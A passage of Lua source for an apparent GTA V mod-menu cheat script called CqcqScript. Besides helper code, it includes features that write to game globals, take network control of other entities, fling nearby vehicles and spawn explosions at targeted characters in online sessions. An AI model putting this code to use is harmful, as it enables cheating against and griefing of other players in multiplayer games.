end
local draw_rect = function (pos0, pos1, pos2, pos3, colour)
	GRAPHICS.DRAW_POLY(pos0.x, pos0.y, pos0.z, pos1.x, pos1.y, pos1.z, pos3.x, pos3.y, pos3.z, colour.r, colour.g, colour.b, colour.a)
	GRAPHICS.DRAW_POLY(pos3.x, pos3.y, pos3.z, pos2.x, pos2.y, pos2.z, pos0.x, pos0.y, pos0.z, colour.r, colour.g, colour.b, colour.a)
end

function zcndxz(state)
    nt = state
    warehouse_scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("WAREHOUSE")
    while nt do
        GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(warehouse_scaleform, "SHOW_OVERLAY")
        GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(warehouse_scaleform, 255, 255, 255, 255, 0)
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("CqcqScript是不是最吊的lua?")
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("请选择以下选项之一")
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("是，并且从前从前也很帅")
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("是，我爱上从前从前了")
        GRAPHICS.END_SCALEFORM_MOVIE_METHOD(warehouse_scaleform)
        util.yield()
     end
end
function draw_bounding_box(entity, showPoly, colour)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
		return
	end
	colour = colour or {r = 255, g = 0, b = 0, a = 255}
	local min = v3.new()
	local max = v3.new()
	MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), min, max)
	min:abs(); max:abs()

	local upperLeftRear = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, -max.x, -max.y, max.z)
	local upperRightRear = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, min.x, -max.y, max.z)
	local lowerLeftRear = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, -max.x, -max.y, -min.z)
	local lowerRightRear = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, min.x, -max.y, -min.z)

	draw_line(upperLeftRear, upperRightRear, colour)
	draw_line(lowerLeftRear, lowerRightRear, colour)
	draw_line(upperLeftRear, lowerLeftRear, colour)
	draw_line(upperRightRear, lowerRightRear, colour)

	local upperLeftFront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, -max.x, min.y, max.z)
	local upperRightFront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, min.x, min.y, max.z)
	local lowerLeftFront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, -max.x, min.y, -min.z)
	local lowerRightFront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, min.x, min.y, -min.z)

	draw_line(upperLeftFront, upperRightFront, colour)
	draw_line(lowerLeftFront, lowerRightFront, colour)
	draw_line(upperLeftFront, lowerLeftFront, colour)
	draw_line(upperRightFront, lowerRightFront, colour)

	draw_line(upperLeftRear, upperLeftFront, colour)
	draw_line(upperRightRear, upperRightFront, colour)
	draw_line(lowerLeftRear, lowerLeftFront, colour)
	draw_line(lowerRightRear, lowerRightFront, colour)

	if type(showPoly) ~= "boolean" or showPoly then
		draw_rect(lowerLeftRear, upperLeftRear, lowerLeftFront, upperLeftFront, colour)
		draw_rect(upperRightRear, lowerRightRear, upperRightFront, lowerRightFront, colour)

		draw_rect(lowerLeftFront, upperLeftFront, lowerRightFront, upperRightFront, colour)
		draw_rect(upperLeftRear, lowerLeftRear, upperRightRear, lowerRightRear, colour)

		draw_rect(upperRightRear, upperRightFront, upperLeftRear, upperLeftFront, colour)
		draw_rect(lowerRightFront, lowerRightRear, lowerLeftFront, lowerLeftRear, colour)
	end
end
---@class RaycastResult
---@field didHit boolean
---@field endCoords v3
---@field surfaceNormal v3
---@field hitEntity Entity

local targetEntity = NULL
local lastStop <const> = newTimer()
local explosionProof = false
function godfinger()
    if is_player_pointing() then
		write_global.int(4521801 + 935, NETWORK.GET_NETWORK_TIME())
		if not ENTITY.DOES_ENTITY_EXIST(targetEntity) then
			local flag = TraceFlag.peds | TraceFlag.vehicles | TraceFlag.pedsSimpleCollision | TraceFlag.objects
			local raycastResult = get_raycast_result(500.0, flag)

			if raycastResult.didHit and ENTITY.DOES_ENTITY_EXIST(raycastResult.hitEntity) then
				targetEntity = raycastResult.hitEntity
			end
		else
			local myPos = players.get_position(players.user())
			local entityPos = ENTITY.GET_ENTITY_COORDS(targetEntity, true)
			local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
			local distance = myPos:distance(entityPos)
			if distance > 30.0 then distance = 30.0
			elseif distance < 10.0 then distance = 10.0 end
			local targetPos = v3.new(camDir)
			targetPos:mul(distance)
			targetPos:add(myPos)
			local direction = v3.new(targetPos)
			direction:sub(entityPos)
			direction:normalise()
			if ENTITY.IS_ENTITY_A_PED(targetEntity) then
				direction:mul(5.0)
				local explosionPos = v3.new(entityPos)
				explosionPos:sub(direction)
				draw_bounding_box(targetEntity, false, {r = 255, g = 255, b = 255, a = 255})
				set_explosion_proof(players.user_ped(), true)
				explosionProof = true
				FIRE.ADD_EXPLOSION(explosionPos.x, explosionPos.y, explosionPos.z, 29, 25.0, false, true, 0.0, true)
			else
				local vel = v3.new(direction)
				local magnitude = entityPos:distance(targetPos)
				vel:mul(magnitude)
				draw_bounding_box(targetEntity, true, {r = 255, g = 255, b = 255, a = 80})
				request_control_once(targetEntity)
				ENTITY.SET_ENTITY_VELOCITY(targetEntity, vel.x, vel.y, vel.z)
			end
		end
	elseif targetEntity ~= NULL then
		lastStop.reset()
		targetEntity = NULL

	elseif explosionProof and lastStop.elapsed() > 500 then
		explosionProof = false
		set_explosion_proof(players.user_ped(), false)
    end
end
HudColour =
{
	pureWhite = 0,
	white = 1,
	black = 2,
	grey = 3,
	greyLight = 4,
	greyDrak = 5,
	red = 6,
	redLight = 7,
	redDark = 8,
	blue = 9,
	blueLight = 10,
	blueDark = 11,
	yellow = 12,
	yellowLight = 13,
	yellowDark = 14,
	orange = 15,
	orangeLight = 16,
	orangeDark = 17,
	green = 18,
	greenLight = 19,
	greenDark = 20,
	purple = 21,
	purpleLight = 22,
	purpleDark = 23,
	radarHealth = 25,
	radarArmour = 26,
	friendly = 118,
}

function request_fx_asset(asset)
	STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
	while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
		util.yield()
	end
end
---@param entity Entity
---@return boolean
function request_control_once(entity)
	if not NETWORK.NETWORK_IS_IN_SESSION() then
		return true
	end
	local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
	NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, true)
	return NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
end
---@param ped Ped
---@param maxVehicles? integer
---@return Entity[]
function get_ped_nearby_vehicles(ped, maxVehicles)
	maxVehicles = maxVehicles or 16
	local pVehicleList = memory.alloc((maxVehicles + 1) * 8)
	memory.write_int(pVehicleList, maxVehicles)
	local vehiclesList = {}
	for i = 1, PED.GET_PED_NEARBY_VEHICLES(ped, pVehicleList) do
		vehiclesList[i] = memory.read_int(pVehicleList + i*8)
	end
	return vehiclesList
end
joaat = util.joaat
wait = util.yield
createPed = PED.CREATE_PED
getEntityCoords = ENTITY.GET_ENTITY_COORDS
getPlayerPed = PLAYER.GET_PLAYER_PED
requestModel = STREAMING.REQUEST_MODEL
hasModelLoaded = STREAMING.HAS_MODEL_LOADED
noNeedModel = STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED
setPedCombatAttr = PED.SET_PED_COMBAT_ATTRIBUTES
giveWeaponToPed = WEAPON.GIVE_WEAPON_TO_PED
vect = {
    ['new'] = function(x, y, z)
        return { ['x'] = x, ['y'] = y, ['z'] = z }
    end,
    ['subtract'] = function(a, b)
        return vect.new(a.x - b.x, a.y - b.y, a.z - b.z)
    end,
    ['add'] = function(a, b)
        return vect.new(a.x + b.x, a.y + b.y, a.z + b.z)
    end,
    ['mag'] = function(a)
        return math.sqrt(a.x ^ 2 + a.y ^ 2 + a.z ^ 2)
    end,
    ['norm'] = function(a)
        local mag = vect.mag(a)
        return vect.div(a, mag)
    end,
    ['mult'] = function(a, b)
        return vect.new(a.x * b, a.y * b, a.z * b)
    end,
    ['div'] = function(a, b)
        return vect.new(a.x / b, a.y / b, a.z / b)
    end,
    ['dist'] = function(a, b)
        
        return vect.mag(vect.subtract(a, b))
    end
}
function ROTATION_TO_DIRECTION(rotation) 
	local adjusted_rotation = 
	{ 
		x = (math.pi / 180) * rotation.x, 
		y = (math.pi / 180) * rotation.y, 
		z = (math.pi / 180) * rotation.z 
	}
	local direction = 
	{
		x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		z =  math.sin(adjusted_rotation.x)
	}
	return direction
end
function round(num, places)
	return tonumber(string.format('%.' .. (places or 0) .. 'f', num))
end
function incr(ptr, fvalue, delta)
    local cvalue = memory.read_float(ptr) 
    local delta = math.abs(delta)
	
	if cvalue ~= fvalue then
    	if cvalue > fvalue then 
			delta = -delta 
		end
		
    	if math.abs(fvalue - cvalue) > delta then
    	    cvalue = cvalue + delta
    	else  
    	    cvalue = fvalue
    	end
	end
    
    memory.write_float(ptr, cvalue)
end



function nvwushen(toggle)
local alloc = memory.alloc
    local getTime = util.current_time_millis
	valkyire_rocket = toggle

	if valkyire_rocket then
		local rocket, cam
		local g = alloc()
		local bar = alloc(); 
		local init
		local sTime
		local draw_rect = function(x, y, z, w)
			GRAPHICS.DRAW_RECT(x, y, z, w, 255, 255, 255, 255)
		end
	
		while valkyire_rocket do
			wait()

			if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
				if not init then init = true end
				sTime = getTime()
			end

			if init then
				if not ENTITY.DOES_ENTITY_EXIST(rocket) then
					local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID())
					local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(weapon, 0.0, 1.0, 0.0)
					rocket =  entities.create_object(joaat('w_lr_rpg_rocket'), c)
					CAM.DESTROY_ALL_CAMS(true)
					cam = CAM.CREATE_CAM('DEFAULT_SCRIPTED_CAMERA', true)
					CAM.ATTACH_CAM_TO_ENTITY(cam, rocket, 0.0, 0.0, 0.0, true)
					CAM.RENDER_SCRIPT_CAMS(true, true, 700, true, true)
					CAM.SET_CAM_ACTIVE(cam, true)
					ENTITY.SET_ENTITY_VISIBLE(rocket, 0)
					memory.write_float(bar, 0.5); memory.write_float(g, 255)
				else
					local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
					CAM.SET_CAM_ROT(cam, rot.x, rot.y, rot.z, 0)
					ENTITY.SET_ENTITY_ROTATION(rocket, rot.x, rot.y, rot.z, 0, 1)

					local c = vect.add(ENTITY.GET_ENTITY_COORDS(rocket), vect.mult(ROTATION_TO_DIRECTION(CAM.GET_GAMEPLAY_CAM_ROT(0)), 0.8))
					ENTITY.SET_ENTITY_COORDS(rocket, c.x, c.y, c.z, false, false, false, false)
					STREAMING.SET_FOCUS_POS_AND_VEL(c.x, c.y, c.z, 5.0, 0.0, 0.0)

					HUD.HIDE_HUD_AND_RADAR_THIS_FRAME()
					PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), true)
					ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
					HUD._HUD_WEAPON_WHEEL_IGNORE_SELECTION()
					
					draw_rect(0.5, 0.5 - 0.025, 0.050, 0.002)
					draw_rect(0.5, 0.5 + 0.025, 0.050, 0.002)
					draw_rect(0.5 - 0.025, 0.5, 0.002, 0.052)
					draw_rect(0.5 + 0.025, 0.5, 0.002, 0.052)
					draw_rect(0.5 + 0.05, 0.5, 0.050, 0.002)
					draw_rect(0.5 - 0.05, 0.5, 0.050, 0.002)
					draw_rect(0.5, 0.5 + 0.05, 0.002, 0.050)
					draw_rect(0.5, 0.5 - 0.05, 0.002, 0.050)
					GRAPHICS.SET_TIMECYCLE_MODIFIER('CAMERA_secuirity')

					GRAPHICS.DRAW_RECT(0.25, 0.5, 0.03, 0.5, 255, 255, 255, 255)

					if getTime() - sTime >= 100 then
						incr(bar, 0, -0.01); incr(g, 0, -4)
						sTime = getTime()
					end

					GRAPHICS.DRAW_RECT(0.25, 0.75 - (memory.read_float(bar) / 2), 0.03, memory.read_float(bar), 255, round(memory.read_float(g)), 0, 255)

					local groundZ = alloc()
					MISC.GET_GROUND_Z_FOR_3D_COORD(ENTITY.GET_ENTITY_COORDS(rocket).x, ENTITY.GET_ENTITY_COORDS(rocket).y, ENTITY.GET_ENTITY_COORDS(rocket).z, groundZ, 0)
					groundZ = memory.read_float(groundZ)
					
					if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(rocket) or math.abs(ENTITY.GET_ENTITY_COORDS(rocket).z - groundZ) < 0.5 or memory.read_float(bar) <= 0.01 then
						local impact_coord = ENTITY.GET_ENTITY_COORDS(rocket); ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
						FIRE.ADD_EXPLOSION(impact_coord.x, impact_coord.y, impact_coord.z, 32, 1.0, true, false, 0.4)
						entities.delete(rocket)
						rocket = 0
						PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
						STREAMING.CLEAR_FOCUS()
						CAM.RENDER_SCRIPT_CAMS(false, false, 3000, true, false, 0)
						CAM.DESTROY_CAM(cam, 1)
						GRAPHICS.SET_TIMECYCLE_MODIFIER('DEFAULT')
						init = false
					end
				end
			end
		end
		GRAPHICS.SET_TIMECYCLE_MODIFIER('DEFAULT')
		STREAMING.CLEAR_FOCUS()
		CAM.RENDER_SCRIPT_CAMS(false, false, 3000, true, false, 0)
		CAM.DESTROY_CAM(cam, 1)
		PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
		rocket = 0
		bar = 0.5
		y = 255
		ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
	end
end
function colorspeed(c)
    rgb.cus = c
end

function attachweapon(spawnweapon)
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 416676503) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 690389602) then
		ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.15, 0, 0.13, 270, 0, 0, false, true, false, false, 1, true)
	end
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -728555052) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -1609580060) then
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_bat")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.3, -0.18, -0.15, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_crowbar")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 90, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_battleaxe")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_golfclub")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hatchet")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_poolcue")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), -0.2, -0.18, 0.1, 0, 120, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stone_hatchet")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_knuckle")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 90, false, true, false, false, 1, true)
		end
		if not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_bat"))  and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_crowbar")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_battleaxe"))and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_golfclub")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hatchet")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_poolcue")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stone_hatchet")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_knuckle")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0, 0, 0.13, 0, 90, 270, false, true, false, false, 1, true)
		end
	end
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1548507267) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -37788308) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1595662460) then	
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_petrolcan")) or (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hazardcan")) or (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fertilizercan")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0, -0.18, -0, 0, 90, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_proxmine")) or (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stickybomb")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 0, 270, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fireextinguisher")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0, -0.05, 0.13, 0, 270, 90, false, true, false, false, 1, true)
		end
		if not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_petrolcan")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hazardcan")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fertilizercan")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_proxmine")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stickybomb")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fireextinguisher")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 270, false, true, false, false, 1, true)
		end
	end

	if not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 416676503) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 690389602) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -728555052) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -1609580060) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1548507267) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -37788308) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1595662460) then
		ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0, -0.18, 0, 180, 220, 0, false, true, false, false, 1, true)
	end
end
function plyped()
	return PLAYER.PLAYER_PED_ID()
end
    vehicle_uses = 0
    ped_uses = 0
    pickup_uses = 0
    player_uses = 0
    object_uses = 0
    handle_ptr = memory.alloc(13*8)
state = 0
local notif_format = ""
function heishoushenying()
    if state == 0 then
		notification(notif_format, HudColour.green, "INPUT_ATTACK", "INPUT_AIM")
		local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
		local colour = {r = 0.5, g = 0.0, b = 0.5, a = 1.0}
		request_fx_asset(effect.asset)
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
		GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
			effect.name, players.user_ped(), 0.0, 0.0, -0.9,1.0, 1.0,1, 1.0, false, false, false
		)
		state = 1
	elseif state == 1 then
		PLAYER.DISABLE_PLAYER_FIRING(players.user(), true)
		PAD.DISABLE_CONTROL_ACTION(0, 25, true)
		PAD.DISABLE_CONTROL_ACTION(0, 68, true)
		PAD.DISABLE_CONTROL_ACTION(0, 91, true)
		local entities = get_ped_nearby_vehicles(players.user_ped())

		for _, vehicle in ipairs(entities) do
			if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and
			PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) == vehicle then
				continue
			end
			if PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) and
			request_control_once(vehicle) then
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 0.5, 1.0, 1.0,1, 0, false, false, true, false, false)

			elseif PAD.IS_DISABLED_CONTROL_PRESSED(0, 25) and
			request_control_once(vehicle) then
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, -70.0,1.0, 1.0,1, 0, false, false, true, false, false)
			end
		end
	end
end
Config = {
	general = {
		standnotifications = false,
		displayhealth = true,
		developer = false, 	
		showintro = true
	},
}
---@class Notification
notification123 =
{
	txdDict = "DIA_ZOMBIE1",
	txdName = "DIA_ZOMBIE1",
	title = "cqcq",
	subtitle = "~b~" .. util.get_label_text("PM_PANE_FEE") .. "~s~",
	defaultColour = HudColour.blue
}
---@param msg string
function notification123.stand(msg)
	assert(type(msg) == "string", "msg must be a string, got " .. type(msg))
	msg = msg:gsub('~[%w_]-~', ""):gsub('<C>(.-)</C>', '%1')
	util.toast("[CqCqScript] " .. msg)
end
---@param format string
---@param colour? HudColour
function notification123:help(format, colour, ...)
	assert(type(format) == "string", "msg must be a string, got " .. type(format))

	local msg = string.format(format, ...)
	if Config.general.standnotifications then
		return self.stand(msg)
	end
	HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(colour or self.defaultColour)
	util.BEGIN_TEXT_COMMAND_THEFEED_POST("~BLIP_INFO_ICON~ " .. msg)
	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER_WITH_TOKENS(true, true)
end
local resource_dir = filesystem.resources_dir()
---@param format string
---@param colour? HudColour
function notification123:normal(format, colour, ...)
	assert(type(format) == "string", "msg must be a string, got " .. type(format))
	local msg = string.format(format, ...)
	if Config.general.standnotifications then
		return self.stand(msg)
	end
	local picture
	if not filesystem.exists(resource_dir) then
		picture = "CHAR_SOCIAL_CLUB"
	else
		picture = "wcnmdpjd"
	end
	HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(colour or self.defaultColour)
	util.BEGIN_TEXT_COMMAND_THEFEED_POST(msg)
	HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, "bart", true, 4, self.title, self.subtitle)
	--HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(self.txdDict, self.txdName, true, 4, self.title, self.subtitle)
	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(false, false)
end
object = 0
local format0 = "按 ~%s~ ~%s~ ~%s~ ~%s~ 来使用地毯式骑行"
local format1 = "按 ~%s~ 以移动得更快"
function carpetridexx()
    if state == 0 then
		local objHash = util.joaat("p_cs_beachtowel_01_s")
		request_model(objHash)
		STREAMING.REQUEST_ANIM_DICT("rcmcollect_paperleadinout@")
		while not STREAMING.HAS_ANIM_DICT_LOADED("rcmcollect_paperleadinout@") do
			util.yield_once()
		end
		local localPed = players.user_ped()
		local pos = ENTITY.GET_ENTITY_COORDS(localPed, false)
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(localPed)
		object = entities.create_object(objHash, pos)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(
			localPed, object, 0, 0, -0.2, 1.0, 1.0, 1.0,1, false, true, false, false, 0, true, false
		)
		ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(object, false, false)

		TASK.TASK_PLAY_ANIM(localPed, "rcmcollect_paperleadinout@", "meditiate_idle", 8.0, -8.0, -1, 1, 0.0, false, false, false)
        notification123:help(format0 .. ".\n" .. format1 .. '.', HudColour.black,
        "INPUT_MOVE_UP_ONLY", "INPUT_MOVE_DOWN_ONLY", "INPUT_VEH_JUMP", "INPUT_DUCK", "INPUT_VEH_MOVE_UP_ONLY")
		state = 1

	elseif state == 1 then
		HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
		local objPos = ENTITY.GET_ENTITY_COORDS(object, false)
		local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
		ENTITY.SET_ENTITY_ROTATION(object, 0, 0, camrot.z, 0, true)
		local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
		forwardV.z = 0.0
		local delta = v3.new(0, 0, 0)
		local speed = 0.2
		if PAD.IS_CONTROL_PRESSED(0, 61) then
			speed = 1.5
		end
		if PAD.IS_CONTROL_PRESSED(0, 32) then
			delta = v3.new(forwardV)
			delta:mul(speed)
		end
		if PAD.IS_CONTROL_PRESSED(0, 130)  then
			delta = v3.new(forwardV)
			delta:mul(-speed)
		end
		if PAD.IS_DISABLED_CONTROL_PRESSED(0, 22) then
			delta.z = speed
		end
		if PAD.IS_CONTROL_PRESSED(0, 36) then
			delta.z = -speed
		end
		local newPos = v3.new(objPos)
		newPos:add(delta)
		ENTITY.SET_ENTITY_COORDS(object, newPos.x,newPos.y,newPos.z, false, false, false, false)
	end
end
function setBit(bitfield, bitNum)
	return (bitfield | (1 << bitNum))
end
function clearBit(bitfield, bitNum)
	return (bitfield & ~(1 << bitNum))
end
function allsqhy()
